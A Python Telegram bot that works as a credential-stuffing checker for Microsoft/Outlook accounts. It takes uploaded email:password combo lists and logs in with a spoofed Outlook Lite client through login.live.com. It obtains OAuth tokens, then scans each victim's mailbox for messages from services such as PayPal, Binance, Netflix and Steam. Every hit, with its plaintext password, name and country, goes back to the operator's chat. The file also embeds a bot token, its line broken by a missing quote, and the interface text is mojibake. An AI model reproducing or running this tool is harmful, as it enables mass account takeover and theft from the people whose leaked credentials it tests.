import telebot
import requests
import uuid
from concurrent.futures import ThreadPoolExecutor
import threading
BOT_TOKEN = "7562545783:AAELr6LIH29BePl-T9paKvpLgc7xZ-vYwwc
bot = telebot.TeleBot(BOT_TOKEN)
selected_options = {}
check_results = {}
lock = threading.Lock()
def create_option_buttons(chat_id):
    markup = telebot.types.InlineKeyboardMarkup(row_width=3)
    options = [
        ('V1', 'üé≠ Facebook '),
        ('V2', 'üé£ Instagram '),
        ('V3', 'üéÆ PUBG '),
        ('V4', 'üïπÔ∏è Konami '),
        ('V5', 'üé∂ TikTok '),
        ('V6', 'üê¶ Twitter '),
        ('V7', 'üí∞ PayPal '),
        ('V8', 'üè¶ Binance '),
        ('V9', 'üé¨ Netflix '),
        ('V10', 'üèπ PlayStation '),
        ('V11', 'üõ°Ô∏è Supercell '),
        ('V12', 'üèÜ EpicGames '),
        ('V13', 'üéµ Spotify '),
        ('V14', '‚ö° Rockstar '),
        ('V15', 'üéÆ Xbox '),
        ('V16', 'üè¢ Microsoft '),
        ('V17', 'üß© Steam '),
        ('V18', 'üî∞ Roblox '),
        ('V19', '‚öΩ EA Sports '),
        ('V21', 'üéÆ Free Fire ')
    ]
    buttons = []
    for option, label in options:
        button_text = f'‚úÖ {label}' if option in selected_options.get(chat_id, []) else label
        buttons.append(telebot.types.InlineKeyboardButton(button_text, callback_data=f'option_{option}'))
    markup.add(*buttons)
    markup.add(telebot.types.InlineKeyboardButton('‚úÖ ÿ®ÿØÿ° ÿßŸÑŸÅÿ≠ÿµ', callback_data='start_check'))
    return markup

def update_button_text(option, chat_id):
    if option in selected_options[chat_id]:
        return f'‚úÖ {option}'
    else:
        return option

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    if chat_id not in selected_options:
        selected_options[chat_id] = [] 
    markup = telebot.types.InlineKeyboardMarkup()
    item1 = telebot.types.InlineKeyboardButton('ùóñùóµùóÆùóªùóªùó≤ùóπ üéÅ', callback_data='login')
   # item2 = telebot.types()
    markup.add(item1)
    bot.send_message(message.chat.id, '''- ŸÖÿ±ÿ≠ÿ®ÿß ÿ®ŸÉ ŸÅŸä ÿ®Ÿàÿ™ ÿµŸäÿØ ÿ≠ÿ≥ÿßÿ®ÿßÿ™ ÿ¨ŸÖŸäÿπ ÿßŸÑÿ®ÿ±ÿßŸÖÿ¨ ŸàÿßŸÑÿßŸÑÿπÿßÿ® ‚Ä¢‚ò∫Ô∏è
- ÿßŸÑÿ®Ÿàÿ™ ŸÖÿ¨ÿßŸÜŸä ŸàŸÑÿß ÿ™Ÿàÿ¨ÿØ ŸÅŸäÿ© ÿßŸä ÿßÿÆÿ∑ÿßÿ° ‚Ä¢
- ŸÖÿ∑Ÿàÿ±ÿ© ÿ®Ÿàÿ™  : @q0omq

~ ŸÅŸÇÿ∑ ŸÇŸÖ ÿ®ÿßÿ±ÿ≥ÿßŸÑ ŸÖŸÑŸÅ (ŸÉŸàŸÖÿ®Ÿà) Ÿàÿ´ŸÖÿß ÿßÿÆÿ™ÿ± ÿßŸÑÿ®ÿ±ÿßŸÖÿ¨ ŸÑŸÑŸÅÿ≠ÿµ ‚Ä¢üê¨

‚Ä¢ ÿ±ÿßÿ®ÿ∑ ŸÇŸÜÿßÿ™Ÿä ŸáŸÜÿß üëá: ''', reply_markup=markup)
@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        chat_id = message.chat.id
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_content = downloaded_file.decode('utf-8')
        global combo_list
        combo_list = file_content.splitlines()
        bot.send_message(chat_id, "ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ™ÿ≠ÿØŸäÿØ ÿßŸÑÿÆŸäÿßÿ±ÿßÿ™ ÿßŸÑÿ™Ÿä ÿ™ÿ±ŸäÿØ ŸÅÿ≠ÿµŸáÿß:", reply_markup=create_option_buttons(chat_id))
    except Exception as e:
        bot.reply_to(message, f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ŸÖÿπÿßŸÑÿ¨ÿ© ÿßŸÑŸÖŸÑŸÅ: {e}")
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data

    if chat_id not in selected_options:
        selected_options[chat_id] = []

    if data.startswith('option_'):
        option = data[7:]
        if option in selected_options[chat_id]:
            selected_options[chat_id].remove(option)
        else:
            selected_options[chat_id].append(option)
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=create_option_buttons(chat_id))
    elif data == 'start_check':
        bot.send_message(chat_id, "ÿßŸÜÿ™ÿ∏ÿ± ÿ¨ÿßÿ± ÿ®ÿØÿ° ÿßŸÑŸÅÿ≠ÿµ ...")
        with lock:
            check_results[chat_id] = {'good': 0, 'bad': 0, 'message_id': None}
        status_message = update_status_message(chat_id)
        check_results[chat_id]['message_id'] = status_message.message_id
        start_checking(chat_id)
    elif data == 'login':
        bot.send_message(chat_id, "ŸÇŸÜÿßÿ™Ÿä : https://t.me/ic1ic2la")
    
def update_status_message(chat_id):
    good_count = check_results[chat_id]['good']
    bad_count = check_results[chat_id]['bad']
    message = f"""
* ‚Ä¢ ŸÑÿß ÿ™ŸÜÿ≥Ÿâ ÿµŸàÿ± ÿßŸÑÿµŸäÿØ ü§ç*
‚úÖ *Good : {good_count}*

‚ùå *Bad : {bad_count}*
"""
    if check_results[chat_id]['message_id']:
        bot.edit_message_text(message, chat_id=chat_id, message_id=check_results[chat_id]['message_id'], parse_mode="Markdown")
    else:
        return bot.send_message(chat_id, message, parse_mode="Markdown")
    return None
a, b = 0, 0
g1 = '\x1b[1;92m\x1b[38;5;208m'
g2 = '\x1b[1;33m'
g3 = '\x1b[1;92m\x1b[38;5;46m'
g5 = '\x1b[1;92m\x1b[38;5;212m'
g6 = '\x1b[1;92m\x1b[38;5;50m'

def get_infoo(Email, Password, token, CID, chat_id) -> str:
    he = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{CID}",
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    try:
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he).json()
        info_name = (r.get('names', []))
        info_Loca = (r.get('accounts', []))
        name = info_name[0]['displayName']
        Loca = info_Loca[0]['location']
    except:
        name = "ÿ∫Ÿäÿ± ŸÖÿ™ŸàŸÅÿ±"
        Loca = "ÿ∫Ÿäÿ± ŸÖÿ™ŸàŸÅÿ±"
    url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0"
    headers = {
        "Host": "outlook.live.com",
        "content-length": "0",
        "x-owa-sessionid": f"{CID}",
        "x-req-source": "Mini",
        "authorization": f"Bearer {token}",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
        "action": "StartupData",
        "x-owa-correlationid": f"{CID}",
        "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
        "origin": "https://outlook.live.com",
        "x-requested-with": "com.microsoft.outlooklite",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://outlook.live.com/",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US,en;q=0.9"
    }
    try:
        rese = requests.post(url, headers=headers, data="").text
        V1 = '÷¥ìçº ‚úÖ ‚åá ùóôùóÆùó∞ùó≤ùóØùóºùóºùó∏ . ìç≤' if 'V1' in selected_options.get(chat_id, []) and 'security@facebookmail.com' in rese else None
        V2 = '÷¥ìçº ‚úÖ ‚åá ùóúùóªùòÄùòÅùóÆùó¥ùóøùóÆùó∫ . ìç≤' if 'V2' in selected_options.get(chat_id, []) and 'security@mail.instagram.com' in rese else None
        V3 = '÷¥ìçº ‚úÖ ‚åá ùó£ùó®ùóïùóö . ìç≤' if 'V3' in selected_options.get(chat_id, []) and "noreply@pubgmobile.com" in rese else None
        V4 = '÷¥ìçº ‚úÖ ‚åá ùóûùóºùóªùóÆùó∫ùó∂ . ìç≤' if 'V4' in selected_options.get(chat_id, []) and 'nintendo-noreply@ccg.nintendo.com' in rese else None
        V5 = '÷¥ìçº ‚úÖ ‚åá ùóßùó∂ùó∏ùóßùóºùó∏ . ìç≤' if 'V5' in selected_options.get(chat_id, []) and 'TikTok' in rese else None
        V6 = '÷¥ìçº ‚úÖ ‚åá ùóßùòÑùó∂ùòÅùòÅùó≤ùóø . ìç≤' if 'V6' in selected_options.get(chat_id, []) and 'info@x.com' in rese else None
        V7 = '÷¥ìçº ‚úÖ ‚åá ùó£ùóÆùòÜùó£ùóÆùóπ . ìç≤' if 'V7' in selected_options.get(chat_id, []) and 'service@paypal.com.br' in rese else None
        V8 = '÷¥ìçº ‚úÖ ‚åá ùóïùó∂ùóªùóÆùóªùó∞ùó≤ . ìç≤' if 'V8' in selected_options.get(chat_id, []) and 'do-not-reply@ses.binance.com' in rese else None
        V9 = '÷¥ìçº ‚úÖ ‚åá ùó°ùó≤ùòÅùóôùóπùó∂ùòÖ . ìç≤' if 'V9' in selected_options.get(chat_id, []) and 'info@account.netflix.com' in rese else None
        V10 = '÷¥ìçº ‚úÖ ‚åá ùó£ùóπùóÆùòÜùòÄùòÅùóÆùòÅùó∂ùóºùóª . ìç≤' if 'V10' in selected_options.get(chat_id, []) and 'reply@txn-email.playstation.com' in rese else None
        V11 = '÷¥ìçº ‚úÖ ‚åá ùó¶ùòÇùóΩùó≤ùóøùó∞ùó≤ùóπùóπ . ìç≤' if 'V11' in selected_options.get(chat_id, []) and 'noreply@id.supercell.com' in rese else None
        V12 = '÷¥ìçº ‚úÖ ‚åá ùóòùóΩùó∂ùó∞ùóöùóÆùó∫ùó≤ùòÄ . ìç≤' if 'V12' in selected_options.get(chat_id, []) and 'help@acct.epicgames.com' in rese else None
        V13 = '÷¥ìçº ‚úÖ ‚åá ùó¶ùóΩùóºùòÅùó∂ùó≥ùòÜ . ìç≤' if 'V13' in selected_options.get(chat_id, []) and 'no-reply@spotify.com' in rese else None
        V14 = '÷¥ìçº ‚úÖ ‚åá ùó•ùóºùó∞ùó∏ùòÄùòÅùóÆùóø . ìç≤' if 'V14' in selected_options.get(chat_id, []) and 'noreply@rockstargames.com' in rese else None
        V15 = '÷¥ìçº ‚úÖ ‚åá ùó´ùóØùóºùòÖ . ìç≤' if 'V15' in selected_options.get(chat_id, []) and 'xboxreps@engage.xbox.com' in rese else None
        V16 = '÷¥ìçº ‚úÖ ‚åá ùó†ùó∂ùó∞ùóøùóºùòÄùóºùó≥ùòÅ . ìç≤' if 'V16' in selected_options.get(chat_id, []) and 'account-security-noreply@accountprotection.microsoft.com' in rese else None
        V17 = '÷¥ìçº ‚úÖ ‚åá ùó¶ùòÅùó≤ùóÆùó∫ . ìç≤' if 'V17' in selected_options.get(chat_id, []) and 'noreply@steampowered.com' in rese else None
        V18 = '÷¥ìçº ‚úÖ ‚åá ùó•ùóºùóØùóπùóºùòÖ . ìç≤' if 'V18' in selected_options.get(chat_id, []) and 'accounts@roblox.com' in rese else None
        V19 = '÷¥ìçº ‚úÖ ‚åá ùóòùóî ùòÄùóΩùóºùóøùòÅùòÄ . ìç≤' if 'V19' in selected_options.get(chat_id, []) and 'EA@e.ea.com' in rese else None
        #V20 = '÷¥ìçº ‚úÖ ‚åá . ìç≤' if 'V20' in selected_options.get(chat_id, []) and 'donotreply@xnxx.com' in rese else None
        V21 = '÷¥ìçº ‚úÖ ‚åá ùóôùóøùó≤ùó≤ ùóôùó∂ùóøùó≤ . ìç≤' if 'V21' in selected_options.get(chat_id, []) and 'noreply@pornhub.com' in rese else None
    except:
        V1=V2=V3=V4=V5=V6=V7=V8=V9=V10=V11=V12=V13=V14=V15=V16=V17=V18=V19=V21 = None

    xb = filter(None, [V1, V2, V3, V4, V5, V6, V7, V8, V9, V10, V11, V12, V13, V14, V15, V16, V17, V18, V19, V21])
    zm = "\n".join(xb)
    jssj = {"AD": "üá¶üá©","AE": "üá¶üá™","AF": "üá¶üá´","AG": "üá¶üá¨","AI": "üá¶üáÆ","AL": "üá¶üá±","AM": "üá¶üá≤","AO": "üá¶üá¥","AQ": "üá¶üá∂","AR": "üá¶üá∑","AS": "üá¶üá∏","AT": "üá¶üáπ","AU": "üá¶üá∫","AW": "üá¶üáº","AX": "üá¶üáΩ","AZ": "üá¶üáø","BA": "üáßüá¶","BB": "üáßüáß","BD": "üáßüá©","BE": "üáßüá™","BF": "üáßüá´","BG": "üáßüá¨","BH": "üáßüá≠","BI": "üáßüáÆ","BJ": "üáßüáØ","BL": "üáßüá±","BM": "üáßüá≤","BN": "üáßüá≥","BO": "üáßüá¥","BQ": "üáßüá∂","BR": "üáßüá∑","BS": "üáßüá∏","BT": "üáßüáπ","BV": "üáßüáª","BW": "üáßüáº","BY": "üáßüáæ","BZ": "üáßüáø","CA": "üá®üá¶","CC": "üá®üá®","CD": "üá®üá©","CF": "üá®üá´","CG": "üá®üá¨","CH": "üá®üá≠","CI": "üá®üáÆ","CK": "üá®üá∞","CL": "üá®üá±","CM": "üá®üá≤","CN": "üá®üá≥","CO": "üá®üá¥","CR": "üá®üá∑","CU": "üá®üá∫","CV": "üá®üáª","CW": "üá®üáº","CX": "üá®üáΩ","CY": "üá®üáæ","CZ": "üá®üáø","DE": "üá©üá™","DJ": "üá©üáØ","DK": "üá©üá∞","DM": "üá©üá≤","DO": "üá©üá¥","DZ": "üá©üáø","EC": "üá™üá®","EE": "üá™üá™","EG": "üá™üá¨","EH": "üá™üá≠","ER": "üá™üá∑","ES": "üá™üá∏","ET": "üá™üáπ","EU": "üá™üá∫","FI": "üá´üáÆ","FJ": "üá´üáØ","FK": "üá´üá∞","FM": "üá´üá≤","FO": "üá´üá¥","FR": "üá´üá∑","GA": "üá¨üá¶","GB-ENG": "üè¥","GB-NIR": "üè¥","GB-SCT": "üè¥","GB-WLS": "üè¥","GB": "üá¨üáß","GD": "üá¨üá©","GE": "üá¨üá™","GF": "üá¨üá´","GG": "üá¨üá¨","GH": "üá¨üá≠","GI": "üá¨üáÆ","GL": "üá¨üá±","GM": "üá¨üá≤","GN": "üá¨üá≥","GP": "üá¨üáµ","GQ": "üá¨üá∂","GR": "üá¨üá∑","GS": "üá¨üá∏","GT": "üá¨üáπ","GU": "üá¨üá∫","GW": "üá¨üáº","GY": "üá¨üáæ","HK": "üá≠üá∞","HM": "üá≠üá≤","HN": "üá≠üá≥","HR": "üá≠üá∑","HT": "üá≠üáπ","HU": "üá≠üá∫","ID": "üáÆüá©","IE": "üáÆüá™","IL": "üáÆüá±","IM": "üáÆüá≤","IN": "üáÆüá≥","IO": "üáÆüá¥","IQ": "üáÆüá∂","IR": "üáÆüá∑","IS": "üáÆüá∏","IT": "üáÆüáπ","JE": "üáØüá™","JM": "üáØüá≤","JO": "üáØüá¥","JP": "üáØüáµ","KE": "üá∞üá™","KG": "üá∞üá¨","KH": "üá∞üá≠","KI": "üá∞üáÆ","KM": "üá∞üá≤","KN": "üá∞üá≥","KP": "üá∞üáµ","KR": "üá∞üá∑","KW": "üá∞üáº","KY": "üá∞üáæ","KZ": "üá∞üáø","LA": "üá±üá¶","LB": "üá±üáß","LC": "üá±üá®","LI": "üá±üáÆ","LK": "üá±üá∞","LR": "üá±üá∑","LS": "üá±üá∏","LT": "üá±üáπ","LU": "üá±üá∫","LV": "üá±üáª","LY": "üá±üáæ","MA": "üá≤üá¶","MC": "üá≤üá®","MD": "üá≤üá©","ME": "üá≤üá™","MF": "üá≤üá´","MG": "üá≤üá¨","MH": "üá≤üá≠","MK": "üá≤üá∞","ML": "üá≤üá±","MM": "üá≤üá≤","MN": "üá≤üá≥","MO": "üá≤üá¥","MP": "üá≤üáµ","MQ": "üá≤üá∂","MR": "üá≤üá∑","MS": "üá≤üá∏","MT": "üá≤üáπ","MU": "üá≤üá∫","MV": "üá≤üáª","MW": "üá≤üáº","MX": "üá≤üáΩ","MY": "üá≤üáæ","MZ": "üá≤üáø","NA": "üá≥üá¶","NC": "üá≥üá®","NE": "üá≥üá™","NF": "üá≥üá´","NG": "üá≥üá¨","NI": "üá≥üáÆ","NL": "üá≥üá±","NO": "üá≥üá¥","NP": "üá≥üáµ","NR": "üá≥üá∑","NU": "üá≥üá∫","NZ": "üá≥üáø","OM": "üá¥üá≤","PA": "üáµüá¶","PE": "üáµüá™","PF": "üáµüá´","PG": "üáµüá¨","PH": "üáµüá≠","PK": "üáµüá∞","PL": "üáµüá±","PM": "üáµüá≤","PN": "üáµüá≥","PR": "üáµüá∑","PS": "üáµüá∏","PT": "üáµüáπ","PW": "üáµüáº","PY": "üáµüáæ","QA": "üá∂üá¶","RE": "üá∑üá™","RO": "üá∑üá¥","RS": "üá∑üá∏","RU": "üá∑üá∫","RW": "üá∑üáº","SA": "üá∏üá¶","SB": "üá∏üáß","SC": "üá∏üá®","SD": "üá∏üá©","SE": "üá∏üá™","SG": "üá∏üá¨","SH": "üá∏üá≠","SI": "üá∏üáÆ","SJ": "üá∏üáØ","SK": "üá∏üá∞","SL": "üá∏üá±","SM": "üá∏üá≤","SN": "üá∏üá≥","SO": "üá∏üá¥","SR": "üá∏üá∑","SS": "üá∏üá∏","ST": "üá∏üáπ","SV": "üá∏üáª","SX": "üá∏üáΩ","SY": "üá∏üáæ","SZ": "üá∏üáø","TC": "üáπüá®","TD": "üáπüá©","TF": "üáπüá´","TG": "üáπüá¨","TH": "üáπüá≠","TJ": "üáπüáØ","TK": "üáπüá∞","TL": "üáπüá±","TM": "üáπüá≤","TN": "üáπüá≥","TO": "üáπüá¥","TR": "üáπüá∑","TT": "üáπüáπ","TV": "üáπüáª","TW": "üáπüáº","TZ": "üáπüáø","UA": "üá∫üá¶","UG": "üá∫üá¨","UM": "üá∫üá≤","US": "üá∫üá∏","UY": "üá∫üáæ","UZ": "üá∫üáø","VA": "üáªüá¶","VC": "üáªüá®","VE": "üáªüá™","VG": "üáªüá¨","VI": "üáªüáÆ","VN": "üáªüá≥","VU": "üáªüá∫","WF": "üáºüá´","WS": "üáºüá∏","XK": "üáΩüá∞","YE": "üáæüá™","YT": "üáæüáπ","ZA": "üáøüá¶","ZM": "üáøüá≤","ZW": "üáøüáº"}
    cccc = jssj.get(Loca, '‚ùî')
    print(f'''Good''')
    message = f"""‚≠í‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ç‚îÄ €∞ ùóîùó∞ùó∞ùóºùòÇùóªùòÅ €∞ ‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ö‚îÄ‚≠í
ìá¢ ‚®æ ùóòùó∫ùóÆùó∂ùóπ ñ†ó „Äî `{Email}` „Äïê¨π‚Äá€´
ìá¢ ‚®æ ùó£ùóÆùòÄùòÄùòÑùóºùóøùó± ñ†ó „Äî `{Password}` „Äïê¨π‚Äá€´
‚≠í‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ç‚îÄ €∞ ùóúùó°ùóôùó¢ €∞ ‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ö‚îÄ‚≠í
ìá¢ ‚®æ ùó°ùóÆùó∫ùó≤ ñ†ó „Äî `{name}` „Äïê¨π‚Äá€´
ìá¢ ‚®æ ùóñùóºùòÇùóªùòÅùóøùòÜ ñ†ó „Äî {cccc} „Äïê¨π‚Äá€´
‚≠í‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ç‚îÄ €∞ ùóüùó∂ùóªùó∏ùó∂ùóªùó¥ €∞ ‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ö‚îÄ◊Ö‚îÄ◊Ç‚îÄ◊Ö‚îÄ‚≠í 
{zm}
"""
    #requests.get(
        #f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto?chat_id={chat_id}&photo=https://t.me/gifgoldentest/7&caption={message}&parse_mode=Markdown&reply_markup={{"inline_keyboard":[[{{"text":"RAVEN","url":"http://t.me/vip_REMA"}}]]}}')
    bot.send_message(chat_id, message, parse_mode="Markdown")
    with lock:
        check_results[chat_id]['good'] += 1
    update_status_message(chat_id)


def login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id) -> str:
    global a, b
    try:
        lenn = f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={Password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        Ln = len(lenn)
        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(Ln),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"{AD}haschrome=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid}"}
        res = requests.post(URL, data=lenn, headers=headers, allow_redirects=False)
        cook = res.cookies.get_dict()
        hh = res.headers
        if any(key in cook for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
            get_token(Email, Password, cook, hh, chat_id)
            a += 1
        elif 'Too Many Requests' in res.text:
            login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id)
        else:
            b += 1
            print(f'{g1}- Bad Account .')
            with lock:
                check_results[chat_id]['bad'] += 1
            update_status_message(chat_id)
    except Exception as e:
        with lock:
            check_results[chat_id]['bad'] += 1
        update_status_message(chat_id)

def get_token(Email,Password,cook,hh,chat_id) -> str:
    Code = hh.get('Location').split('code=')[1].split('&')[0]
    CID = cook.get('MSPCID').upper()
    try:
        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
        "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
        "grant_type": "authorization_code",
        "code": Code,
        "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
        response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
        token = response.json()["access_token"]
        get_infoo(Email,Password,token,CID,chat_id)
    except Exception as e:
        with lock:
            check_results[chat_id]['bad'] += 1
        update_status_message(chat_id)

def get_values(Email, Password, chat_id):
    headers = {
        #	    "Host": "login.microsoftonline.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "return-client-request-id": "false",
        "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
        "x-ms-sso-ignore-sso": "1",
        "correlation-id": str(uuid.uuid4()),
        "x-client-ver": "1.1.0+9e54a0d1",
        "x-client-os": "28",
        "x-client-sku": "MSAL.xplat.android",
        "x-client-src-sku": "MSAL.xplat.android",
        "X-Requested-With": "com.microsoft.outlooklite",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        response = requests.get(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + str(
                Email) + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers=headers)
        cok = response.cookies.get_dict()
        URL = response.text.split("urlPost:'")[1].split("'")[0]
        PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
        AD = response.url.split('haschrome=1')[0]
        MSPRequ = cok['MSPRequ']
        uaid = cok['uaid']
        RefreshTokenSso = cok['RefreshTokenSso']
        MSPOK = cok['MSPOK'],
        OParams = cok['OParams']
        login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id)
    except Exception as e:
        with lock:
            check_results[chat_id]['bad'] += 1
        update_status_message(chat_id)

def start_checking(chat_id):
    global combo_list
    executor = ThreadPoolExecutor(max_workers=10)

    futures = []
    for line in combo_list:
        try:
            if ':' in line:
                email = line.strip().split(':')[0]
                password = line.strip().split(':')[1]
                future = executor.submit(get_values, email, password, chat_id)
                futures.append(future)
            else:
                pass
        except Exception as e:
            with lock:
                check_results[chat_id]['bad'] += 1
            update_status_message(chat_id)
    for future in futures:
        try:
            future.result()
        except Exception as e:
            print(f"Exception in thread: {e}")
            with lock:
                check_results[chat_id]['bad'] += 1
            update_status_message(chat_id)


    executor.shutdown(wait=True)
    bot.send_message(chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑŸÅÿ≠ÿµ ...")
print('ÿßŸÑÿ®Ÿàÿ™ ŸäÿπŸÖŸÑ ...')
bot.enable_save_next_step_handlers(delay=2)

bot.load_next_step_handlers()

bot.infinity_polling()
